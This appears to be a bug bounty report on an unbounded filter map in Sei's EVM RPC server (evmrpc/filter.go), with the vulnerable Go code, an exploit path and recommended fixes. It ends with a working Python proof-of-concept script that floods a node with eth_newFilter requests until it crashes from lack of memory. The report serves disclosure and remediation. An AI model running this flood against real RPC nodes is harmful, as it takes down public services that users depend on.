### Title
Unbounded Filter Map Growth via Unauthenticated `eth_newFilter`/`eth_newBlockFilter` Causes RPC Node OOM Crash - (`File: evmrpc/filter.go`)

---

### Summary

`FilterAPI` in Sei's EVM RPC layer maintains an in-memory `map[ethrpc.ID]filter` with no maximum size cap and no rate limiting on filter creation. Any unauthenticated caller can flood `eth_newFilter` or `eth_newBlockFilter` to insert unlimited entries into this map, exhausting the RPC node's memory and crashing it. The cleanup loop only evicts entries older than the `FilterTimeout` (default 120 s), so an attacker who refreshes entries faster than the timeout can keep the map growing indefinitely.

---

### Finding Description

**Root cause — no size cap on `a.filters`:**

`NewFilterAPI` initializes the filter store as a plain unbounded Go map:

```go
filters := make(map[ethrpc.ID]filter)
``` [1](#0-0) 

`NewFilter` and `NewBlockFilter` insert into this map unconditionally, with no check on the current map size and no per-caller rate limit:

```go
curFilterID := ethrpc.NewID()
a.filters[curFilterID] = filter{
    typ:        LogsSubscription,
    fc:         crit,
    cancelFunc: cancel,
    lastAccess: time.Now(),
    ...
}
``` [2](#0-1) [3](#0-2) 

**Cleanup does not bound the map size:**

The cleanup goroutine fires every `timeout/2` (default 60 s) and removes only entries whose `lastAccess` is older than `timeout` (default 120 s):

```go
if now.Sub(filter.lastAccess) > timeout {
    toRemove = append(toRemove, id)
}
``` [4](#0-3) 

An attacker who creates new filters continuously never triggers this condition — every new entry has `lastAccess = time.Now()` and will not be evicted for at least 120 s.

**No rate limiting on filter creation:**

The `globalRPSLimiter` (30 RPS) is only checked inside `GetLogs` for large block-range queries:

```go
if blockRange > RPSLimitThreshold && !a.globalRPSLimiter.Allow() {
``` [5](#0-4) 

`NewFilter` and `NewBlockFilter` contain no rate-limiting check at all. There is also no per-IP or per-connection limit anywhere in the filter creation path.

**Two independent instances, both vulnerable:**

The HTTP server creates separate `FilterAPI` instances for the `eth` and `sei` namespaces, each with its own unbounded map: [6](#0-5) 

**Default `FilterTimeout` is 120 s:** [7](#0-6) 

**Exploit path:**

1. Attacker opens an HTTP connection to the public EVM RPC port (8545).
2. Sends a tight loop of `{"method":"eth_newFilter","params":[{}]}` JSON-RPC calls — no authentication required.
3. Each call inserts one `filter` struct (containing a `context.CancelFunc`, a `filters.FilterCriteria`, and metadata) into `a.filters`.
4. At ~10,000 requests/s (easily achievable over a single keep-alive connection), the map grows by ~10,000 entries/s. Each entry is ~200–400 bytes; at 1 M entries the process holds ~200–400 MB of extra heap.
5. The cleanup goroutine fires every 60 s but cannot remove any of these entries because they were all created within the last 120 s.
6. The RPC node process is killed by the OS OOM killer.

---

### Impact Explanation

The EVM RPC node crashes, making `eth_*` and `sei_*` JSON-RPC endpoints unavailable. This maps to **Medium** under the Sei bounty scope: *"unauth RPC/gRPC crash"*. Validators are not directly affected, but all user-facing EVM interactions (transactions, queries, dApp connectivity) are severed for the duration of the attack.

---

### Likelihood Explanation

- **No authentication or stake required** — any internet-accessible RPC node is a target.
- **Single HTTP connection suffices** — no need for multiple source IPs or special tooling.
- **Attack is cheap and repeatable** — the attacker pays only network bandwidth; the victim pays memory.
- **Default configuration is vulnerable** — `FilterTimeout = 120 s` with no size cap is the shipped default.

---

### Recommendation

1. **Enforce a hard cap on `a.filters`**: reject `NewFilter`/`NewBlockFilter` with an error when `len(a.filters)` exceeds a configurable maximum (e.g., 10,000).
2. **Rate-limit filter creation**: apply the existing `globalRPSLimiter` (or a dedicated, stricter limiter) to `NewFilter` and `NewBlockFilter`.
3. **Per-IP rate limiting**: track filter creation counts per remote IP and reject excess requests.

---

### Proof of Concept

```python
import socket, itertools, json

HOST, PORT = "rpc-node-ip", 8545
req = json.dumps({"jsonrpc":"2.0","id":1,"method":"eth_newFilter",
                  "params":[{"fromBlock":"latest","toBlock":"latest"}]}) + "\n"

s = socket.create_connection((HOST, PORT))
# Wrap in HTTP keep-alive
http_req = (
    f"POST / HTTP/1.1\r\nHost: {HOST}\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(req)}\r\n"
    "Connection: keep-alive\r\n\r\n" + req
)
for _ in itertools.count():
    s.sendall(http_req.encode())
    s.recv(4096)   # drain response
# Monitor victim: watch -n1 'ps aux | grep seid'
# Memory grows until OOM kill
```
